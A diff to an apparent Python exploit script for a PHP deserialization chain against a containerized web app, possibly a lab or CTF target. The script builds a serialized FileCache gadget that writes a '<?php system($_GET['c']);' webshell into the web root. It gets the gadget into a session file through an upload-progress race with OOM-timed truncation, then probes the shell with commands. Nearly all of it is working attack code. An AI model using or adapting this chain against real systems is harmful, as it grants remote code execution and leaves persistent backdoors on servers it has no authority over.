@@ -15,9 +15,7 @@ captured in recon, then verified against the real bytes on disk.
 """
 from __future__ import annotations
 
-import json
 import os
-import re
 import socket
 import subprocess
 import time
@@ -62,11 +60,34 @@ def set_geometry(name: str) -> None:
     g = GEOMETRIES[name]
     LEN2, L1, CL_R = g["LEN2"], g["L1"], g["CL_R"]
 # RCE payload record: FileCache gadget (see app/gadget.php). Its __destruct
-# drops a webshell at /var/www/html/s.php when the consumer request ends.
-# <?=...; is always available (short_open_tag is irrelevant for <?=).
-OBJ = (b'evil|O:9:"FileCache":2:{s:4:"path";s:19:"/var/www/html/s.php";'
-       b's:7:"content";s:22:"<?=system($_GET[\'c\']);";}')
-SHELL_URL_PATH = "/s.php"
+# drops a webshell at /var/www/html/<SHELL_NAME> when the consumer request
+# ends. The name is randomised per run so a stale shell can never fake a
+# hit. <?php is always available (unlike short tags, which are a config).
+SHELL_NAME = "s.php"
+
+
+def set_shell(name: str) -> None:
+    global SHELL_NAME
+    SHELL_NAME = name
+
+
+def shell_path() -> str:
+    return "/" + SHELL_NAME
+
+
+def obj_bytes() -> bytes:
+    path = f"/var/www/html/{SHELL_NAME}".encode()
+    # <?php, not <?= : system() already PRINTS its output, and <?= would
+    # additionally echo system()'s return value - doubling every command.
+    content = b"<?php system($_GET['c']);"
+    return (b'evil|O:9:"FileCache":2:{s:4:"path";s:'
+            + str(len(path)).encode() + b':"' + path
+            + b'";s:7:"content";s:' + str(len(content)).encode()
+            + b':"' + content + b'";}')
+
+
+def new_shell_name() -> str:
+    return "s_" + uuid.uuid4().hex[:12] + ".php"
 # After R's filename string closes in the mixed file, the parser is still
 # nested inside a:5:{ a:1:{ a:7:{ . These bytes complete a:7's remaining
 # 5 elements and close all three arrays, returning to top level, where the
@@ -91,7 +112,7 @@ def restart_victim() -> None:
             out = subprocess.run(["curl", "-s", "--max-time", "2",
                                   f"http://{HOST}:{PORT}/"],
                                  capture_output=True, timeout=5)
-            if b'"php"' in out.stdout:
+            if b"welcome" in out.stdout:   # the app's plain response
                 time.sleep(0.4)
                 return
         except Exception:
@@ -140,34 +161,6 @@ def set_mem_limit(bytes_: int) -> None:
                    check=True, timeout=30)
 
 
-def find_child_by_port(src_port: int) -> int | None:
-    """PID inside the container of the apache child holding our src port."""
-    out = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c",
-                          "cat /proc/net/tcp /proc/net/tcp6 2>/dev/null"],
-                         capture_output=True, text=True, timeout=15).stdout
-    inode = None
-    for line in out.splitlines()[1:]:
-        f = line.split()
-        if len(f) < 10:
-            continue
-        local = f[1]
-        try:
-            lp = int(local.split(":")[1], 16)
-        except ValueError:
-            continue
-        if lp == src_port and f[3] == "01":  # ESTABLISHED
-            inode = f[9]
-            break
-    if not inode:
-        return None
-    out = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c",
-                          f"ls -l /proc/*/fd 2>/dev/null | grep -B20 'socket:[{inode}]' "
-                          f"| grep -oE '/proc/[0-9]+' | tail -1"],
-                         capture_output=True, text=True, timeout=20).stdout
-    m = re.search(r"(\d+)", out)
-    return int(m.group(1)) if m else None
-
-
 def set_oom_adj(pid: int, adj: int) -> bool:
     r = subprocess.run(["docker", "exec", CONTAINER, "sh", "-c",
                         f"echo {adj} > /proc/{pid}/oom_score_adj"],
@@ -211,19 +204,6 @@ def sess_chmod(sid: str, mode: str = "666") -> None:
     subprocess.run(["docker", "exec", "--user", "www-data", CONTAINER,
                     "chmod", mode, f"/tmp/sess_{sid}"],
                    check=True, timeout=15)
-
-
-def sess_sync_evict(sid: str) -> None:
-    """Flush dirty pages then drop the session file's page cache."""
-    sh("sync")
-    try:
-        fd = os.open(sess_path(sid), os.O_RDONLY)
-        try:
-            os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
-        finally:
-            os.close(fd)
-    except OSError:
-        pass
 
 
 # ---------------------------------------------------------------- requests
@@ -310,26 +290,14 @@ def progress_body(field_name: str, filename: str, data: bytes) -> bytes:
 
 
 def consume(sid: str, port: int = PORT, timeout: float = 15.0) -> dict:
-    """GET the consumer endpoint and return the parsed session report."""
+    """GET the consumer page (plain app response, kept for debugging)."""
     req = (f"GET /index.php HTTP/1.1\r\nHost: localhost\r\n"
            f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
     _, resp = _http(port, req, read_resp=True, timeout=timeout)
-    txt = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp
-    # display_errors may prepend warnings; extract the JSON object
-    start = txt.find(b"{")
-    if start < 0:
-        return {"raw": txt[:400].decode(errors="replace")}
-    try:
-        return json.loads(txt[start:])
-    except json.JSONDecodeError:
-        return {"raw": txt[:400].decode(errors="replace")}
+    return {"raw": resp[:400].decode(errors="replace")}
 
 
 # ---------------------------------------------------------------- geometry
-
-def progress_len_replacement() -> int:
-    """Predicted length of R's progress record (= Pr)."""
-    return len(r_prefix()) + LEN2 + len(r_suffix())
 
 
 def r_prefix(bp: int | None = None) -> bytes:
@@ -395,17 +363,18 @@ def build_payload(p_start: int, e_off: int) -> bytes:
     plant = e_off - p_start
     if plant < 0:
         raise ValueError(f"plant offset negative: {plant}")
+    obj = obj_bytes()
     total_c = p_start + L1 + 2          # |C|
     # pad record: pad|s:T:"<content>";  content ends at |C|-2
     t = 0
     for _ in range(6):
         pad = f'pad|s:{t}:"'.encode()
-        pad_content_start = p_start + plant + len(SUFFIX) + len(OBJ) + len(pad)
+        pad_content_start = p_start + plant + len(SUFFIX) + len(obj) + len(pad)
         t_new = total_c - 2 - pad_content_start
         if t_new == t:
             break
         t = t_new
-    payload = b"A" * plant + SUFFIX + OBJ + pad
+    payload = b"A" * plant + SUFFIX + obj + pad
     if len(payload) > L1:
         raise ValueError(f"payload {len(payload)} > L1 {L1}")
     payload += b"B" * (L1 - len(payload))
@@ -418,7 +387,7 @@ def verify_c(c: bytes, p_start: int, e_off: int, payload: bytes) -> None:
     rel = e_off - p_start
     assert payload[rel:rel + len(SUFFIX)] == SUFFIX, "suffix not at E'"
     obj_at = e_off + len(SUFFIX)
-    assert c[obj_at:obj_at + len(OBJ)] == OBJ, "object not after suffix"
+    assert c[obj_at:obj_at + len(obj_bytes())] == obj_bytes(), "object not at E'"
     assert len(c) == p_start + L1 + 2, f"|C|={len(c)} expected {p_start + L1 + 2}"
 
 
@@ -454,3 +423,97 @@ def pick_k(f_actual: int, e_actual: int) -> int:
     if k > (e_actual & ~4095):
         k = e_actual & ~4095
     return k
+
+
+# ------------------------------------------------- session file classification
+
+def extract_r_fields(data: bytes) -> tuple[int, int] | None:
+    """(bytes_processed, start_time) of the progress record, if present."""
+    import re as _re
+    m = _re.search(rb's:15:"bytes_processed";i:(\d+);s:4:"done"', data[:400])
+    t = _re.search(rb's:10:"start_time";i:(\d+);', data[:400])
+    if not m or not t:
+        return None
+    return int(m.group(1)), int(t.group(1))
+
+
+def classify_file(data: bytes, c: bytes) -> tuple[str, int | None]:
+    """
+    Locate k by reading the session file itself (local controller only).
+
+    R contains a run of exactly LEN2 'G' bytes (the replacement filename).
+    In the mixed file that run is truncated at k, because everything from
+    k on comes from C (whose payload never contains G).
+      - file == C        -> OOM before the write            ("early", 0)
+      - G-run absent     -> k landed before the filename hdr ("early", ~0)
+      - G-run shorter    -> k = end of run, inside [f, E')  ("mix", k) = HIT
+      - G-run complete   -> k >= E' or file = full R        ("late", E')
+    """
+    if not data:
+        return "empty", None
+    if data == c:
+        return "early", 0
+    marker = f's:{LEN2}:"'.encode()
+    gi = data.find(marker)
+    if gi < 0:
+        fields = extract_r_fields(data)
+        if fields:
+            rp = r_prefix(bp=fields[0])
+            for i in range(130, min(len(data), len(rp))):
+                if data[i] != rp[i]:
+                    return "early", i
+        return "early", 0
+    gs = gi + len(marker)
+    ge = gs
+    while ge < len(data) and data[ge] == ord("G"):
+        ge += 1
+    if ge - gs == LEN2:
+        return "late", e_offset()        # filename fully written: k >= E'
+    return "mix", ge                     # truncated run: k in [f, E') = hit
+
+
+# ------------------------------------------------------------ webshell probe
+
+def _dechunk(data: bytes) -> bytes:
+    """Decode a Transfer-Encoding: chunked body."""
+    out = b""
+    i = 0
+    while i < len(data):
+        j = data.find(b"\r\n", i)
+        if j < 0:
+            break
+        try:
+            n = int(data[i:j], 16)
+        except ValueError:
+            return data
+        if n == 0:
+            break
+        out += data[j + 2:j + 2 + n]
+        i = j + 2 + n + 2
+    return out or data
+
+
+def probe_shell(port: int, cmd: str = "id",
+                timeout: float = 10.0) -> bytes | None:
+    """GET /<shell_path>?c=<cmd>.
+
+    b'' = the target answered and there is no shell (definitive 404);
+    None = the target could not be reached (retryable - it may be
+    restarting after an OOM).
+
+    The only positive RCE signal of the no-oracle chain: the shell name
+    is randomised per run (set_shell), so a stale shell from another run
+    can never fake a hit. Pure HTTP - the remote chain may use it.
+    """
+    req = (f"GET {shell_path()}?c={cmd} HTTP/1.1\r\n"
+           f"Host: {HOST}\r\nConnection: close\r\n\r\n").encode()
+    try:
+        _, resp = _http(port, req, read_resp=True, timeout=timeout)
+    except OSError:
+        return None
+    head, _, body = resp.partition(b"\r\n\r\n")
+    if b" 200 " not in head.split(b"\r\n", 1)[0]:
+        return b""                        # 404 / error: no shell here
+    if b"transfer-encoding: chunked" in head.lower():
+        return _dechunk(body)
+    return body
